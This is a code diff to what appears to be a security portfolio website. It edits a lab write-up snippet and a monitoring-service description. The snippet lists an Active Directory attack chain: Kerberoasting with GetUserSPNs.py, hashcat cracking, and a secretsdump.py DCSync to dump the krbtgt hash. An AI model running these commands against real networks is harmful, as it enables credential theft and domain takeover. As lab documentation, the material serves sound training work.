@@ -226,13 +226,13 @@ const WRITE_UPS: WriteUp[] = [
       ],
       codeSnippet: `# Active Directory Attack Chain Commands (Sanitized Lab)
 # 1. Enumerate and request Kerberos SPN tickets
-GetUserSPNs.py corp.internal/jdoe:Password123 -dc-ip 10.10.10.1 -request -outputfile tgs_hashes.txt
+GetUserSPNs.py corp.internal/jdoe:Password123 -dc-ip dc.corp.internal -request -outputfile tgs_hashes.txt
 
 # 2. Offline hash cracking via Hashcat
 hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule --force
 
 # 3. Perform DCSync to dump KRBTGT hash
-secretsdump.py corp.internal/svc_backup:CrackedPass@10.10.10.1 -just-dc-user krbtgt`
+secretsdump.py corp.internal/svc_backup:CrackedPass@dc.corp.internal -just-dc-user krbtgt`
     }
   },
   {
@@ -1183,7 +1183,7 @@ export default function Home() {
                   </h3>
 
                   <p className="text-xs sm:text-sm text-slate-300 leading-relaxed">
-                    Surveillance node deployed on dedicated state host <strong>INTERNAL-NOC-HOST</strong> running a high-concurrency Node.js kernel on port 3001. Continuously executes sub-second synthetic heartbeats across 38 district collectorate routers and mission-critical State Data Centre (SDC) e-governance backbones (<em>Mission-Critical SDC Portals</em>). Features an autonomous 2-minute recurring Python failover watchdog (<code className="text-sky-300 bg-slate-950 px-1.5 py-0.5 rounded border border-slate-800">portal_monitor_daemon.py</code>) and zero cloud data egress.
+                    Surveillance telemetry engine deployed within the sovereign State Data Centre boundary running an event-driven Node.js service kernel. Continuously executes sub-second synthetic heartbeats across 38 district collectorate routers and mission-critical State Data Centre (SDC) e-governance backbones (<em>Mission-Critical SDC Portals</em>). Features an autonomous 2-minute recurring Python failover watchdog (<code className="text-sky-300 bg-slate-950 px-1.5 py-0.5 rounded border border-slate-800">portal_monitor_daemon.py</code>) and zero cloud data egress.
                   </p>
 
                   <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5 pt-1">
